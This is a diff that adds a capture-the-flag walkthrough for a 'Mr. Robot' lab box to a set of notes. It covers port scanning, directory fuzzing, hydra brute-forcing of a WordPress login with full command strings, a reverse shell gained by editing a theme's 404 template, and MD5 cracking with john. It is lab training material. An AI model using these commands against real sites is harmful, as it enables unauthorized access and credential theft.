@@ -968,5 +968,69 @@ Let's proceed to brute force the ticket (I used john, since I do not have enough
 We can decode the password as follows:
 
 	echo dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ= | base64 --decode
+
+## MR. Robot CTF
+As usual proceed to scan the box:
+
+	rustscan -b 900 -a 10.10.228.157
+We have only to services: 80, 443
+
+	nmap -A -sVC -p 80,443 -Pn 10.10.228.157
+We have an Apache web server running, let's visit the web site and play a bit with the options to entertain us a bit :).
+Nothing really helpful came out. Let's proceed to fuzz the webserver
+
+	ffuf -u https://10.10.228.157/FUZZ -mc 200,301 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c
+
+We discovered that the site is hosted on Wordpress, among the usual found folder there is one that hits my attention:
+
+	robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 93ms]
+Visiting we see the name of 2 files:
+
+	fsocity.dic
+	key-1-of-3.txt
+
+Tehy files are placed in the webroot and are self-explanatory. The .dic file suggests us that we should try to brute-force the wp-login.
+Since we cannot find the username using well-known user [enumertation techniques](https://gosecure.ai/blog/2021/03/16/6-ways-to-enumerate-wordpress-users/), we have to proceed to brute-foce username in first place. Since we get the following error: <b>ERROR: Invalid username.</b>, we can set up the following attack:
+
+	hydra -L fsocity.dic -p Admin1234 10.10.228.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=https%3A%2F%2F10.10.228.157%2Fwp-admin%2F&testcookie=1:Invalid username." 
+
+After a while we got
+
+	...
+ 	[80][http-post-form] host: 10.10.228.157   login: Elliot   password: Admin1234
+	...
+ 	[80][http-post-form] host: 10.10.228.157   login: elliot   password: Admin1234
+
+Now we can proceed to test if a different error is returned for a wrong password. We got: <b>The password you entered for the username Elliot is incorrect</b>. So we can set up the following attack for password brute-force:
+
+ 	hydra -P fsocity.dic -l elliot 10.10.228.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=https%3A%2F%2F10.10.228.157%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
+
+ 	[80][http-post-form] host: 10.10.228.157   login: elliot   password: ER28-0652
+
+Now that we can access WP we can get a reverse shell modify the following template:
+
+	https://10.10.228.157/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen
+
+ Now visiting the following URL we can get a shell on our attacker machine:
+
+ 	https://10.10.228.157/404
+  We are in as user daemon. In /home/robot there is a file withe the following contents:
+
+  	robot:c3fcd3d76192e4007dfb496cca67e13b
+   We can try to reverse it:
+   
+   	echo c3fcd3d76192e4007dfb496cca67e13b > hash.txt
+    	john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                        
+	....
+ 	abcdefghijklmnopqrstuvwxyz (?)    
+
+Now login as robot user.
+
+
+
+
+
+
 	
+
  	
